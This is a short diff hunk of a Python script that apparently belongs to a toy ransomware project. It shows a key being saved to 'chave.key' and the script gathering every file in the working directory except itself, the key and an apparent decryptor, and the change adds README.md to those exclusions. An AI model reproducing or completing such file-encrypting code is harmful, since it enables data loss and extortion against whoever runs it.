@@ -10,7 +10,7 @@ with open("chave.key", "wb") as chave:
     chave.write(key)
 
 for file in os.listdir():
-    if file == "madara.py" or file == "chave.key" or file == "guy_sensei.py":
+    if file == "madara.py" or file == "chave.key" or file == "guy_sensei.py" or file == "README.md":
         continue
     if os.path.isfile(file):
         files.append(file)
